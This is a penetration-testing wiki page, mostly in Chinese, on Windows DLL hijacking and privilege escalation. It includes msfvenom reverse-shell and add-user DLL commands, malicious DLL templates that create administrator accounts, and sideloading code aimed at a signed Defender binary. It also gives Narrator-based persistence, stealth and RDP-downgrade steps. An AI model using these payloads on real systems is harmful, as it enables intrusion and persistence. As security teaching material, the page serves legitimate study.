# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序去加载恶意 DLL。该术语包含多种策略，如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于 code execution、achieving persistence，较少用于 privilege escalation。尽管这里重点讨论 escalation，hijacking 的方法在不同目标间是一致的。

### 常见技术

有多种方法用于 DLL hijacking，每种方法的有效性取决于应用程序的 DLL 加载策略：

1. **DLL Replacement**：将真实的 DLL 替换为恶意 DLL，可选择使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在比合法 DLL 更优先被搜索的路径中，利用应用的搜索顺序。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使得应用认为这是所需但不存在的 DLL 并去加载它。
4. **DLL Redirection**：修改诸如 %PATH% 或 .exe.manifest / .exe.local 文件等搜索参数，引导应用加载恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在与被复制应用同处于用户可控的目录中，类似于 Binary Proxy Execution 技术。

## 查找缺失的 Dlls

在系统内查找缺失 DLLs 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置以下 2 个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

然后仅显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你要查找的是**一般的 missing dlls**，就让它运行几**秒**。\
如果你要查找某个**特定可执行文件内的 missing dll**，应该再设置一个过滤器，例如 "Process Name" "contains" `<exec name>`，运行该可执行文件，然后停止捕获事件。

## Exploiting Missing Dlls

为了提升权限，最好的机会是能够在某个特权进程会尝试加载的搜索位置写入一个 DLL。也就是说，我们可以在一个目录中写入 DLL，使得该目录在搜索顺序中位于原始 DLL 所在目录之前（奇怪的情况），或者我们能写入某个会被搜索但原始 DLL 在任何目录中都不存在的文件夹。

### Dll Search Order

在 [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中可以找到 DLL 如何被加载的具体说明。

Windows 应用按照预定义的搜索路径集合和特定顺序查找 DLL。DLL hijacking 问题在于恶意 DLL 被策略性地放置在这些目录之一，从而确保它在真实 DLL 之前被加载。防止此问题的一个解决办法是确保应用在引用所需 DLL 时使用绝对路径。

下面是 32-bit 系统上的 **DLL search order**：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

这是启用 **SafeDllSearchMode** 时的默认搜索顺序。当其被禁用时，当前目录会升到第二位。要禁用该功能，请在注册表中创建 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode 并将其设置为 0（默认启用）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数并使用 **LOAD_WITH_ALTERED_SEARCH_PATH** 标志，则搜索将从 LoadLibraryEx 正在加载的可执行模块所在的目录开始。

最后，请注意 **a dll could be loaded indicating the absolute path instead just the name**。在这种情况下，该 dll **只会在该路径中被搜索**（如果该 dll 有任何依赖项，这些依赖项将按名称像普通加载那样被搜索）。

还有其他方法可以改变搜索顺序，但这里不再赘述。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

一种高级且可确定性地影响新创建进程 DLL 搜索路径的方法是在使用 ntdll 的本地 API 创建进程时，设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在此处提供攻击者可控的目录，当目标进程按名称解析导入的 DLL（没有绝对路径且未使用安全加载标志）时，可以迫使其从该目录加载恶意 DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个指向你可控文件夹的自定义 DllPath（例如放置 dropper/unpacker 的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将在解析期间咨询所提供的 DllPath，从而即使恶意 DLL 不与目标 EXE 共置也能可靠地进行 sideloading。

注意/限制
- 这会影响被创建的子进程；它不同于 SetDllDirectory（后者只影响当前进程）。
- 目标必须按名称导入或通过 LoadLibrary 加载 DLL（不能使用绝对路径，且不能使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。Forwarded exports 和 SxS 可能会改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>完整的 C 示例：通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 将一个恶意的 xmllite.dll（导出所需函数或代理到真实的 DLL）放到你的 DllPath 目录中。
- 使用上述技术启动一个已签名的二进制，该二进制已知会按名称查找 xmllite.dll。加载器通过提供的 DllPath 解析导入并 sideload 你的 DLL。

该技术已在真实环境中被观察到用于驱动多阶段 sideloading 链：初始 launcher 放置一个辅助 DLL，随后它会生成一个 Microsoft 签名、可被劫持的二进制并设置自定义 DllPath，从而强制从一个临时目录加载攻击者的 DLL。


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- 识别一个在不同权限下运行或将要以不同权限运行的进程（横向或侧向移动），该进程**缺少某个 DLL**。
- 确保你对将要**搜索该 DLL 的任意目录**具有**写权限**。该位置可能是可执行文件的目录或系统路径内的某个目录。

是的，要满足这些前提条件比较困难，**默认情况下很难找到一个缺少 DLL 的特权可执行文件**，更别提**对系统路径文件夹有写权限**（默认情况下你没有）。但在配置错误的环境中这是可能的。\
如果你足够幸运并且满足这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使该项目的**主要目标是绕过 UAC**，你也可能在里面找到针对你所用 Windows 版本的 DLL hijacking 的 **PoC**（可能只需更改为你有写权限的文件夹路径即可）。

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以使用下面的命令检查 executable 的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要获取关于如何 **滥用 Dll Hijacking 以提升权限**（在具有写入权限的 **System Path folder** 的情况下）的完整指南，请查看：

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 将检查你是否对 system PATH 中的任一文件夹具有写入权限。\
发现此漏洞的其他有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### Example

如果你发现一个可利用的场景，成功利用它最重要的事情之一是 **创建一个至少导出可执行文件将从中导入的所有函数的 dll**。另外，请注意 Dll Hijacking 在 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或者 从[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)** 时非常有用。** 你可以在这个专注于执行型 dll hijacking 的研究中找到 **如何创建有效 dll** 的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在 **下一节** 中你可以找到一些 **基本 dll 代码**，可作为 **模板** 或用于创建 **导出非必需函数的 dll**。

## **创建和编译 Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一个 Dll，能够在被加载时 **执行你的恶意代码**，同时通过将所有调用转发到真实库来 **按预期暴露并工作**。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以选择一个可执行文件并选择要 proxify 的库，然后 **生成一个 proxified dll**，或者指定该 Dll 并 **生成一个 proxified dll**。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86 我没有看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自定义

请注意，在多种情况下你编译的 Dll 必须 **导出若干函数**，这些函数会被受害进程加载；如果这些函数不存在，**二进制文件将无法加载**它们，**利用将失败**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例（含用户创建）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>替代的 C DLL（带线程入口）</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 仍然在启动时探测一个可预测的、特定语言的 localization DLL，该 DLL 可以被 hijacked 用于任意代码执行和持久化。

关键要点
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

使用 Procmon 发现
- 过滤器：`Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 直接的 hijack 会触发语音/高亮 UI。为保持静默，在 attach 时枚举 Narrator 线程，打开主线程（`OpenThread(THREAD_SUSPEND_RESUME)`）并对其执行 `SuspendThread`；在你自己的线程中继续运行。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 配置如上后，启动 Narrator 时会加载放置的 DLL。在 secure desktop（登录屏幕）按 CTRL+WIN+ENTER 可启动 Narrator。

RDP-triggered SYSTEM execution (lateral movement)
- 允许经典 RDP 安全层：`reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 到主机后，在登录屏幕按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在 secure desktop 上以 SYSTEM 身份执行。
- 执行会在 RDP 会话关闭时停止 —— 请尽快注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表项（例如 CursorIndicator），编辑它以指向任意二进制/DLL，导入后将 `configuration` 设置为该 AT 名称。这样可在 Accessibility 框架下代理任意执行。

Notes
- 在 `%windir%\System32` 下写入和修改 HKLM 值需要管理员权限。
- 所有 payload 逻辑可以放在 `DLL_PROCESS_ATTACH`；不需要导出函数。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates Phantom DLL Hijacking in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as CVE-2025-1729.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天 09:30 在已登录用户上下文下运行。
- **Directory Permissions**: 目录对 `CREATOR OWNER` 可写，允许本地用户放置任意文件。
- **DLL Search Behavior**: 尝试先从其工作目录加载 `hostfxr.dll`，若缺失会记录 "NAME NOT FOUND"，这表明本地目录搜索具有优先级。

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为标准用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文中于 9:30 AM 运行。
3. 如果在任务执行时有管理员登录，恶意 DLL 将在管理员会话中以 medium integrity 运行。
4. 串联标准的 UAC bypass 技术，将权限从 medium integrity 提升到 SYSTEM 权限。

## 参考资料

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
